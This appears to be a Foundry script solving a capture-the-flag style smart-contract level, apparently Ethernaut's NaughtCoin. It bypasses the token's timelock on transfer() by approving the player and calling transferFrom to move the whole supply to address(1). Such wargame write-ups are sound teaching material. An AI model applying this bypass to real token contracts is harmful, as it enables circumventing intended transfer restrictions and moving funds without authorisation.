// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperConfig} from "./HelperConfig.s.sol";
import {NaughtCoin} from "../src/15_NaughtCoin.sol";

contract NaughtCoinAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
  address player = vm.envAddress("USER");

  function run() external {
    
    HelperConfig helperConfig = new HelperConfig();
    address challengeInstanceAddress = helperConfig.instances("NaughtCoin");
    NaughtCoin challenge = NaughtCoin(challengeInstanceAddress);
    vm.startBroadcast(deployerPrivateKey);
    
    console.log("Allowance before: %d", challenge.allowance(player, address(challenge)));
    challenge.approve(player, challenge.INITIAL_SUPPLY());
    console.log("Allowance after: %d", challenge.allowance(player, address(challenge)));
    
    console.log("Balance before: %d", challenge.balanceOf(player));
    challenge.transferFrom(player, address(1), challenge.INITIAL_SUPPLY());
    console.log("Balance after: %d", challenge.balanceOf(player));
    
    vm.stopBroadcast();
  }
}